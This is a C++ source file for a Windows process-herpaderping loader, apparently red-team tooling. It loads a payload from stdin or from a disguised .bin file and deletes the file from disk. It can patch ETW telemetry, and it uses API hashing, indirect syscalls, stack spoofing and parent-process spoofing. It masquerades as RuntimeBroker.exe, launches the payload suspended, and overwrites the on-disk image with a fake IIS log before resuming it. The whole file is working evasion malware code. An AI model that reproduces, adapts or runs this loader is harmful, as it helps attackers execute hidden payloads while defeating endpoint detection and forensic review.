#include <Windows.h>

#include <stdio.h>

#include <tlhelp32.h>

#include "CWLInc.h"

#include "StackSpoof.h"

#include "obfstr.h"

#include "api_hash.h"

#include "syscall.h"



#ifdef CWLDEBUG
#define DBG_PRINT(fmt, ...) printf("[DBG] " fmt "\n", ##__VA_ARGS__)
#else
#define DBG_PRINT(fmt, ...) ((void)0)
#endif

#ifndef CWLDEBUG
#undef perror
#define perror(x) ((void)0)
#endif



// Default payload path - can be overridden at compile time

// Usage: msbuild ... /p:PreprocessorDefinitions="PAYLOAD_PATH=L\"D:\\custom\\path.exe\""

#ifndef PAYLOAD_PATH

#define PAYLOAD_PATH L"C:\\ProgramData\\CertCA.bin"

#endif



#ifdef ENABLE_PAYLOAD_XOR
static const BYTE PAYLOAD_XOR_BASE = 0xA3;
static const BYTE PAYLOAD_XOR_STEP = 0x5B;
#endif



#ifdef ENABLE_ETW_PATCH
// B1 — ETW Patch (T1562.006): patch ntdll!EtwEventWrite → xor eax,eax; ret

// Suppresses ETW events for NtCreateSection / NtCreateProcessEx / NtWriteVirtualMemory

// Must be called before any NT API invocation to prevent DC0021 telemetry

static void PatchEtw()

{

	HMODULE hNtdll = GetNtdllBase();

	PVOID pEtw = RESOLVE_API(hNtdll, EtwEventWrite);

	if (!pEtw) { DBG_PRINT("PatchEtw: EtwEventWrite not resolved, skipping"); return; }

	DBG_PRINT("PatchEtw: EtwEventWrite resolved at %p", pEtw);

	DWORD old = 0;

	VirtualProtect(pEtw, 4, PAGE_EXECUTE_READWRITE, &old);

	memcpy(pEtw, "\x33\xC0\xC3", 3);  // xor eax,eax; ret

	VirtualProtect(pEtw, 4, old, &old);

	DBG_PRINT("PatchEtw: EtwEventWrite patched (xor eax,eax; ret)");

}
#endif  // ENABLE_ETW_PATCH



static HANDLE GetNonJobParent()

{

	const wchar_t* targets[] = { OBFWSTR(L"svchost.exe"), OBFWSTR(L"wininit.exe"), NULL };

	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnap == INVALID_HANDLE_VALUE) return GetCurrentProcess();

	PROCESSENTRY32W pe = { sizeof(pe) };

	if (Process32FirstW(hSnap, &pe)) {

		do {

			for (int i = 0; targets[i]; i++) {

				if (_wcsicmp(pe.szExeFile, targets[i]) == 0) {

					DWORD sid = 0xFFFF;

					ProcessIdToSessionId(pe.th32ProcessID, &sid);

					if (sid != 0) continue;

					HANDLE h = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pe.th32ProcessID);

					if (h) { DBG_PRINT("GetNonJobParent: using %ls (PID=%lu)", pe.szExeFile, pe.th32ProcessID); CloseHandle(hSnap); return h; }

				}

			}

		} while (Process32NextW(hSnap, &pe));

	}

	CloseHandle(hSnap);

	DBG_PRINT("GetNonJobParent: no suitable parent found, using self");

	return GetCurrentProcess();

}



// GetPayloadBuffer: two delivery modes
// Mode 1 (STDIN): read payload from stdin with 4-byte LE size header (no named disk artifact)
//   - Detection: parent spawns CWLHerpaderping with stdin pipe
//   - Flow: stdin → VirtualAlloc → ReadFile(stdin) → Herpaderping
// Mode 2 (FILE): file-based loading; XOR-decode in-memory if ENABLE_PAYLOAD_XOR
//   - Detection: CreateFileW → ReadFile → DeleteFileW (T1070.004)

BYTE *GetPayloadBuffer(OUT size_t &p_size)

{

	HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE);

	DWORD stdinType = GetFileType(hStdin);

	

	// Mode 1: STDIN pipe — payload enters via stdin, no named disk artifact

	// Check if stdin is redirected (FILE type instead of CHAR device)

	if (hStdin != INVALID_HANDLE_VALUE && stdinType == FILE_TYPE_PIPE)

	{

		// Read 4-byte size header (little-endian DWORD)

		DWORD payloadSize = 0;

		DWORD bytesRead = 0;

		if (!ReadFile(hStdin, &payloadSize, sizeof(DWORD), &bytesRead, NULL) || bytesRead != sizeof(DWORD))

		{

			perror("[-] Failed to read payload size from stdin\n");

			exit(-1);

		}

		

		DBG_PRINT("GetPayloadBuffer: payload size from stdin = %lu bytes", payloadSize);

		// Validate size (sanity check: 1KB - 50MB range)

		if (payloadSize < 1024 || payloadSize > 50 * 1024 * 1024)

		{

			perror("[-] Invalid payload size from stdin\n");

			exit(-1);

		}

		

		DBG_PRINT("GetPayloadBuffer: stdin pipe detected");

		// Allocate RW buffer for payload

		BYTE *bufferAddress = (BYTE *)VirtualAlloc(0, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		if (bufferAddress == NULL)

		{

			perror("[-] Failed to allocate memory for stdin payload buffer\n");

			exit(-1);

		}

		

		// Read payload bytes from stdin

		bytesRead = 0;

		if (!ReadFile(hStdin, bufferAddress, payloadSize, &bytesRead, NULL) || bytesRead != payloadSize)

		{

			perror("[-] Failed to read payload from stdin\n");

			VirtualFree(bufferAddress, 0, MEM_RELEASE);

			exit(-1);

		}

		

		DBG_PRINT("GetPayloadBuffer: stdin payload read OK (%lu bytes)", bytesRead);

		p_size = payloadSize;

		// NO DeleteFileW — no file to clean up in stdin mode

		return bufferAddress;

	}

	

	// Mode 2: FILE-based loading (legacy fallback)

	// Used for testing or when stdin not available

	DBG_PRINT("GetPayloadBuffer: file mode, loading from disk");

	HANDLE hFile = CreateFileW(PAYLOAD_PATH, GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE)

	{

		perror("[-] Failed to open payload file (no stdin and no file found)\n");

		return NULL;

	}

	p_size = GetFileSize(hFile, NULL);

	BYTE *bufferAddress = (BYTE *)VirtualAlloc(0, p_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (bufferAddress == NULL)

	{

		perror("[-] Failed to allocate memory for payload buffer\n");

		exit(-1);

	}

	DWORD bytesRead = 0;

	if (!ReadFile(hFile, bufferAddress, p_size, &bytesRead, NULL))

	{

		perror("[-] Failed to read payload buffer from file\n");

		exit(-1);

	}

	DBG_PRINT("GetPayloadBuffer: file payload read OK (%zu bytes)", p_size);

	CloseHandle(hFile);

	DeleteFileW(PAYLOAD_PATH);  // T1070.004 - only in file mode

#ifdef ENABLE_PAYLOAD_XOR
	for (size_t i = 0; i < p_size; i++) {
		bufferAddress[i] ^= (BYTE)((PAYLOAD_XOR_BASE + (BYTE)(i * PAYLOAD_XOR_STEP)) & 0xFF);
	}
	DBG_PRINT("GetPayloadBuffer: XOR decoded payload (%zu bytes)", p_size);
#endif

	return bufferAddress;

}




BOOL Herpaderping(BYTE *payload, size_t payloadSize)
{
	HMODULE hNtdll = GetNtdllBase();

	// Single indirect syscall — NtCreateUserProcess creates process + thread atomically
	// via the standard Windows process creation path. Avoids the NtCreateSection +
	// NtCreateProcessEx pattern that EDR PsSetCreateProcessNotifyRoutineEx callbacks
	// recognize and terminate immediately (causing 0xC0000005 on the next Nt* call).
	if (!InitSyscallPool(hNtdll))
	{
		perror("[-] Failed to initialize indirect syscall pool\n");
		exit(-1);
	}
	DBG_PRINT("Herpaderping: indirect syscall pool initialized");
	INDIRECT_SYSCALL(_NtCreateUserProcess, pNtCreateUserProcess, NtCreateUserProcess);
	SealSyscallPool();

	if (!pNtCreateUserProcess)
	{
		perror("[-] Couldn't resolve SSN for NtCreateUserProcess\n");
		exit(-1);
	}

	_RtlCreateProcessParametersEx pRtlCreateProcessParametersEx =
		(_RtlCreateProcessParametersEx)RESOLVE_API(hNtdll, RtlCreateProcessParametersEx);
	_RtlInitUnicodeString pRtlInitUnicodeString =
		(_RtlInitUnicodeString)RESOLVE_API(hNtdll, RtlInitUnicodeString);
	if (!pRtlCreateProcessParametersEx || !pRtlInitUnicodeString)
	{
		perror("[-] Failed to resolve Rtl helper APIs\n");
		exit(-1);
	}

	HANDLE hTemp = INVALID_HANDLE_VALUE;
	HANDLE hProcess = NULL;
	HANDLE hThread  = NULL;
	NTSTATUS status;
	DWORD bytesWritten;

	// Write payload to temp file — NtCreateUserProcess maps it as the process image
	wchar_t tempFile[MAX_PATH] = {0};
	wchar_t tempPath[MAX_PATH] = {0};
	GetTempPathW(MAX_PATH, tempPath);
	GetTempFileNameW(tempPath, L"HD", 0, tempFile);

	hTemp = CreateFileW(tempFile, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE,
						FILE_SHARE_READ, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0);
	if (hTemp == INVALID_HANDLE_VALUE)
	{
		perror("[-] Unable to create temp file\n");
		exit(-1);
	}
	if (!WriteFile(hTemp, payload, payloadSize, &bytesWritten, NULL))
	{
		perror("[-] Unable to write payload to temp file\n");
		exit(-1);
	}
	FlushFileBuffers(hTemp);
	CloseHandle(hTemp);
	hTemp = INVALID_HANDLE_VALUE;
	DBG_PRINT("Herpaderping: temp file created and payload written: %ls (%lu bytes)", tempFile, bytesWritten);

	// Build NT path: \\??\<tempFile>
	wchar_t ntImagePath[MAX_PATH + 8] = {0};
	wsprintfW(ntImagePath, L"\\??\\%s", tempFile);

	// Process parameters — masquerade as RuntimeBroker.exe
	UNICODE_STRING uTargetFilePath;
	wchar_t targetFilePath[MAX_PATH] = {0};
	lstrcpyW(targetFilePath, OBFWSTR(L"C:\\Windows\\System32\\RuntimeBroker.exe"));
	pRtlInitUnicodeString(&uTargetFilePath, targetFilePath);

	UNICODE_STRING uDllPath;
	wchar_t dllDir[MAX_PATH] = {0};
	lstrcpyW(dllDir, OBFWSTR(L"C:\\Windows\\System32"));
	pRtlInitUnicodeString(&uDllPath, dllDir);

	PRTL_USER_PROCESS_PARAMETERS processParameters = NULL;
	status = pRtlCreateProcessParametersEx(&processParameters, &uTargetFilePath, &uDllPath,
										   NULL, &uTargetFilePath, NULL, NULL, NULL, NULL, NULL,
										   RTL_USER_PROC_PARAMS_NORMALIZED);
	if (!NT_SUCCESS(status))
	{
		DBG_PRINT("Herpaderping: RtlCreateProcessParametersEx failed (0x%08lx)", status);
		exit(-1);
	}
	DBG_PRINT("Herpaderping: process parameters created OK");

	// PS_CREATE_INFO
	PS_CREATE_INFO createInfo;
	memset(&createInfo, 0, sizeof(createInfo));
	createInfo.Size  = sizeof(createInfo);
	createInfo.State = PsCreateInitialState;

	// PS_ATTRIBUTE_LIST — image name + PPID spoof
	UNICODE_STRING uNtImagePath;
	pRtlInitUnicodeString(&uNtImagePath, ntImagePath);

	HANDLE hParent = GetNonJobParent();

	PS_ATTRIBUTE_LIST attrList;
	memset(&attrList, 0, sizeof(attrList));
	attrList.TotalLength             = sizeof(SIZE_T) + 2 * sizeof(PS_ATTRIBUTE);
	attrList.Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
	attrList.Attributes[0].Size      = uNtImagePath.Length;
	attrList.Attributes[0].ValuePtr  = uNtImagePath.pBuffer;
	attrList.Attributes[1].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;
	attrList.Attributes[1].Size      = sizeof(HANDLE);
	attrList.Attributes[1].Value     = (ULONG_PTR)hParent;

	// NtCreateUserProcess — process + thread created atomically, thread starts suspended.
	// The image is mapped from tempFile at this point; we overwrite the file below
	// before resuming, so the on-disk artifact becomes the IIS decoy.
	{
		StackSpoofer spoofer(OBFSTR("kernel32.dll"));
		spoofer.Activate();
		status = pNtCreateUserProcess(&hProcess, &hThread,
									  PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS,
									  NULL, NULL,
									  0,
									  THREAD_CREATE_FLAGS_CREATE_SUSPENDED,
									  processParameters,
									  &createInfo,
									  &attrList);
		spoofer.Deactivate();
	}
	if (hParent != GetCurrentProcess()) CloseHandle(hParent);
	if (!NT_SUCCESS(status))
	{
		DBG_PRINT("Herpaderping: NtCreateUserProcess failed (0x%08lx)", status);
		exit(-1);
	}
	DBG_PRINT("Herpaderping: NtCreateUserProcess OK (hProcess=%p hThread=%p state=%d)",
			  hProcess, hThread, (int)createInfo.State);

	// Liveness check before touching the process further
	if (WaitForSingleObject(hProcess, 0) == WAIT_OBJECT_0)
	{
		DBG_PRINT("Herpaderping: ghost process already terminated — EDR killed it post-NtCreateUserProcess, aborting");
		exit(-1);
	}
	DBG_PRINT("Herpaderping: liveness check passed");

	// Overwrite temp file in-place with IIS log decoy while thread is still suspended.
	// The image section was mapped at NtCreateUserProcess time, so payload runs from
	// memory; the file on disk will show only log entries.
	hTemp = CreateFileW(tempFile, GENERIC_READ | GENERIC_WRITE,
						FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hTemp != INVALID_HANDLE_VALUE)
	{
		SetFilePointer(hTemp, 0, NULL, FILE_BEGIN);
		const char* decoyLines[] = {
			"#Software: Microsoft Internet Information Services 10.0\r\n",
			"#Version: 1.0\r\n",
			"#Date: 2026-05-28 00:00:00\r\n",
			"#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken\r\n",
			"2026-05-28 08:14:02 10.0.0.5 GET /api/health - 443 - 10.0.0.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) - 200 0 0 15\r\n",
			"2026-05-28 08:14:03 10.0.0.5 POST /api/upload/status - 443 TESTLAB\\svc_web 10.0.0.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) - 200 0 0 47\r\n",
			"2026-05-28 08:14:05 10.0.0.5 GET /portal/assets/main.css - 443 - 10.0.0.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) https://upload.testlab.local/portal 200 0 0 3\r\n",
			"2026-05-28 08:14:05 10.0.0.5 GET /portal/assets/app.js - 443 - 10.0.0.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) https://upload.testlab.local/portal 200 0 0 5\r\n",
			"2026-05-28 08:14:07 10.0.0.5 GET /favicon.ico - 443 - 10.0.0.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) - 404 0 2 1\r\n",
			"2026-05-28 08:14:12 10.0.0.5 POST /api/upload/chunk - 443 TESTLAB\\svc_web 10.0.0.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) https://upload.testlab.local/portal 200 0 0 203\r\n",
		};
		const int decoyCount = _countof(decoyLines);
		SIZE_T totalWritten = 0;
		int idx = 0;
		while (totalWritten < payloadSize)
		{
			const char* line = decoyLines[idx % decoyCount];
			DWORD len = (DWORD)strlen(line);
			if (totalWritten + len > payloadSize) len = (DWORD)(payloadSize - totalWritten);
			DWORD wrote = 0;
			if (!WriteFile(hTemp, line, len, &wrote, NULL) || wrote == 0) break;
			totalWritten += wrote;
			idx++;
		}
		FlushFileBuffers(hTemp);
		CloseHandle(hTemp);
		hTemp = INVALID_HANDLE_VALUE;
		DBG_PRINT("Herpaderping: temp file overwritten with decoy (%zu / %zu bytes)", totalWritten, payloadSize);
	}
	else
	{
		DBG_PRINT("Herpaderping: temp file overwrite skipped (GLE=%lu)", GetLastError());
	}

	// Resume suspended thread — ghost process begins execution
	DWORD prevCount = ResumeThread(hThread);
	if (prevCount == (DWORD)-1)
	{
		DBG_PRINT("Herpaderping: ResumeThread failed (GLE=%lu)", GetLastError());
		exit(-1);
	}
	DBG_PRINT("Herpaderping: ResumeThread OK (prevSuspendCount=%lu), ghost process running", prevCount);

	return TRUE;
}



int wmain()

{

#ifdef ENABLE_ETW_PATCH
	PatchEtw();
#endif

	DBG_PRINT("main: CWLHerpaderping starting");

	size_t payloadSize;

	BYTE *payloadBuffer = GetPayloadBuffer(payloadSize);

	DBG_PRINT("main: payload loaded (%zu bytes), launching Herpaderping", payloadSize);

	BOOL isSuccess = Herpaderping(payloadBuffer, payloadSize);

	DBG_PRINT("main: Herpaderping returned %d", isSuccess);

}